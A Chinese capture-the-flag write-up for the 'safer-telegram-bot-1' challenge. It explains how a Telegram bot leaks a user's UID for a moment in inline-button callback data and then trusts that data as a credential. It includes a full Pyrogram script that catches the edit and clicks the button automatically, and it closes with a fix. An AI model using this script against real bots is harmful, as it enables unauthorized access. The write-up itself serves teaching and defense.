# safer-telegram-bot-1

## 题目简述

bot 启动时创建 `user1`，其 UID 是 $1$ 到 $10^6$ 之间的随机整数，`flag1.txt` 的内容保存在 `user1.flag`：

```js
const user1 = createUser(
  ~~(1 + Math.random() * 1000000),
  "test",
  fs.readFileSync(__dirname + "/flag1.txt", "utf8")
);
```

flag 的出口是 `callback_query` 事件。处理函数从按钮的 `callback_data` 中取第一个下划线前的整数；只要它等于 `user1.uid`，当前点击者就会被加入授权列表并收到 `user1.flag`：

```js
bot.on("callback_query", async (query) => {
  const callbackData = query.data || "";
  const userId = parseInt(callbackData.split("_")[0]);

  if (userId !== user1.uid) {
    return await sendMessage(chatId, "not authorized");
  }

  if (!isAuthorizedUid(query.from.id)) {
    authorizedUids.push({
      // 当前点击按钮的 Telegram 用户
    });
  }

  return await sendMessage(
    chatId,
    "Your flag is `" + toSafeCode(user1.flag) + "`"
  );
});
```

漏洞在于 bot 把客户端可见、可回传的 `callback_data` 当作认证凭据，而 `/login` 流程又会在一次短暂的消息编辑中把真实 `user1.uid` 放进该字段。解题目标是自动捕捉这次编辑并立即点击按钮，不需要猜测 UID。

## 解题过程

### 1. 确认 `callback_query` 中哪些字段可信

[Telegram Bot API 的 `CallbackQuery` 定义](https://core.telegram.org/bots/api#callbackquery)说明：

- `from` 是实际点击按钮的用户；
- `message` 是承载按钮的 bot 消息；
- `data` 是按钮携带的回调数据；
- 文档特别提醒，收到回调时，原消息甚至可能已经不再包含具有该数据的按钮。

这意味着 `data` 适合表示操作类型或服务端索引，不适合单独承担授权。题目虽然从 `query.from.id` 得到了真实点击者，却先用攻击者可见的 `query.data` 决定是否授权，信任边界放错了位置。

### 2. 找到真实 UID 泄露的时间窗口

跟踪 `/login` 命令对 inline keyboard 的连续编辑，可以看到按钮数据依次经历三种状态：

```js
"0_login_callback:" + msg.chat.id + ":" + msg.message_id
authorizedUids[0].uid + "_login_callback:" + msg.chat.id + ":" + msg.message_id
"-1_login_callback:" + msg.chat.id + ":" + msg.message_id
```

中间状态的前缀正是验证函数要求的真实 UID。根据官方验题记录，这一状态在比赛服务器上的期望持续时间约为 400 ms；前一个状态会持续约 2 到 16 秒，所以依靠肉眼看到编辑后再手点通常来不及。

用户账号通过 MTProto 客户端能够接收 `edited_message` 更新，其中包含当前 inline keyboard 及其 `callback_data`。因此自动化逻辑非常直接：

1. 向 bot 发送 `/login`；
2. 监听该私聊中的消息编辑；
3. 读取第一行第一个按钮的数据；
4. 当前缀是正整数时，立即提交该 callback。

`0` 和 `-1` 分别是前后两个无效状态；真实随机 UID 一定为正数，所以无需预先知道其值。

### 3. 用用户态客户端自动点击

[Pyrogram 的 `request_callback_answer()`](https://docs.pyrogram.org/api/methods/request_callback_answer)就是“以用户身份点击 inline button”的底层等价操作，所需参数是聊天 ID、消息 ID 和按钮的 callback data。下面给出完整脚本；`TG_API_ID` 与 `TG_API_HASH` 需要按 Telegram 的官方应用注册流程取得，脚本不会使用 bot token：

```python
#!/usr/bin/env python3
import asyncio
import os

from pyrogram import Client, filters


BOT_USERNAME = "actfgamebot01bot"
API_ID = int(os.environ["TG_API_ID"])
API_HASH = os.environ["TG_API_HASH"]

app = Client(
    "actf-safer-bot-1",
    api_id=API_ID,
    api_hash=API_HASH,
)

clicked = asyncio.Event()
finished = asyncio.Event()


@app.on_edited_message(filters.private)
async def click_transient_button(client, message):
    if message.chat.username != BOT_USERNAME:
        return
    if not message.reply_markup or not message.reply_markup.inline_keyboard:
        return

    button = message.reply_markup.inline_keyboard[0][0]
    callback_data = button.callback_data
    if callback_data is None:
        return

    callback_text = (
        callback_data.decode() if isinstance(callback_data, bytes) else callback_data
    )
    try:
        uid_prefix = int(callback_text.split("_", 1)[0])
    except (TypeError, ValueError):
        return

    if uid_prefix <= 0 or clicked.is_set():
        return

    clicked.set()
    print(f"clicking transient uid={uid_prefix}")
    await client.request_callback_answer(
        message.chat.id,
        message.id,
        callback_data,
    )


@app.on_message(filters.private)
async def print_bot_reply(_, message):
    if message.chat.username != BOT_USERNAME or not message.text:
        return
    print(message.text)
    if "ACTF{" in message.text:
        finished.set()


async def main():
    async with app:
        await app.send_message(BOT_USERNAME, "/login")
        try:
            await asyncio.wait_for(finished.wait(), timeout=30)
        except asyncio.TimeoutError as error:
            raise SystemExit("no flag received within 30 seconds") from error


if __name__ == "__main__":
    asyncio.run(main())
```

官方原始脚本会对两次消息编辑都调用按钮接口；这通常不影响出 flag，但会提交无效的 `0` 或 `-1` 状态。上面的版本先解析前缀，只在看到正 UID 时点击，行为和漏洞条件一一对应。

实际 flag 只存在于比赛 bot 的 `flag1.txt`，仓库没有给出其明文，因此不能从静态附件中补写一个未经证实的 flag。

## 方法总结

本题是短时状态泄露与错误授权设计的组合：随机 UID 本身并不弱，但它被嵌进用户可读、可重放的按钮数据中；服务端随后又把这段数据当作身份凭据。400 ms 的窗口只是自动化门槛，不是密码学保护。

解题时应把 Telegram 的两层接口分清：Bot API 文档帮助判断 `CallbackQuery` 的字段语义，用户态 MTProto 框架则允许监听消息编辑并模拟点击。看到动态 inline keyboard 时，应保存每次编辑后的 `callback_data`，而不是只盯着消息文字。

修复方式是始终基于 `query.from.id` 和服务端保存的会话状态授权，并让 callback data 只携带一次性随机标识；服务端还应校验该标识是否属于当前用户、当前消息且尚未使用，不能把业务 UID 直接暴露后再拿它作认证。
